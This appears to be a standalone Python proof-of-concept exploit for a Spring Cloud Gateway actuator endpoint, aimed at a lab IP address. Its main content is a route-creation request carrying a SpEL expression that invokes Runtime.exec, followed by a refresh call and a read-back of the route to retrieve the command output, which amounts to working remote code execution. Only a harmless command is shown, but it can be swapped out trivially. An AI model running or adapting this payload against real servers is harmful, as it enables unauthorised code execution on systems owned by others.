#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : BerMalBerIst
# @Software: PyCharm
# @Time    : 2022/3/4
import requests
from past.builtins import raw_input


def say_hi(name):

    r1 = requests.post(
        url="http://192.168.144.136:8080/actuator/gateway/routes/test",
        json={
          "id": "test",
          "filters": [{
            "name": "AddResponseHeader",
            "args": {
              "name": "Result",
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"time\"}).getInputStream()))}"
            }
          }],
          "uri": "http://example.com"
        }
    )
    r2 = requests.post(
        url="http://192.168.144.136:8080/actuator/gateway/refresh"
    )

    r3 = requests.get("http://192.168.144.136:8080/actuator/gateway/routes/test")
    print(r1.status_code)
    print(r2.status_code)
    print(r3.status_code)
    print(r3.text)




if __name__ == '__main__':
    slogon = '''
  __________                _____         .__ __________             .___          __   
  \______   \ ___________  /     \ _____  |  |\______   \ ___________|   | _______/  |_ 
   |    |  _// __ \_  __ \/  \ /  \\__  \ |  | |    |  _// __ \_  __ \   |/  ___/\   __\\
   |    |   \  ___/|  | \/    Y    \/ __ \|  |_|    |   \  ___/|  | \/   |\___ \  |  |  
   |______  /\___  >__|  \____|__  (____  /____/______  /\___  >__|  |___/____  > |__|  
          \/     \/              \/     \/            \/     \/               \/        
    '''
    print(slogon)
    #domain = raw_input("cmdï¼š")
    domain = "howdoyouturnthison"
    say_hi(domain)

